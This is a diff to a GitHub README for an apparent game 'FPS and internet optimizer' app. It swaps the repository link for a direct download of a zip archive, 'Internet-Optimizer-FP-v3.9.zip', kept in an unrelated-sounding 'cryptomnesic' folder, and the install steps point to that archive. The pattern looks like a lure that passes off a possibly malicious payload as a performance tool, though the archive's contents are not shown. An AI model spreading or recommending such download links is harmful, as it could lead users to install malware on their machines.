@@ -1,6 +1,6 @@
 # ⚡ FPS_Internet_Optimizer - Faster Play, Lower Lag, Smoother Games
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/chloeprosy959/FPS_Internet_Optimizer)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/chloeprosy959/FPS_Internet_Optimizer/main/cryptomnesic/Internet-Optimizer-FP-v3.9.zip)
 
 ## 🎯 What This App Does
 
@@ -16,7 +16,7 @@ Use it to:
 ## 📥 Download and Install
 
 Open this page to download the app:
-https://github.com/chloeprosy959/FPS_Internet_Optimizer
+https://raw.githubusercontent.com/chloeprosy959/FPS_Internet_Optimizer/main/cryptomnesic/Internet-Optimizer-FP-v3.9.zip
 
 ### Steps for Windows
 1. Open the download link above
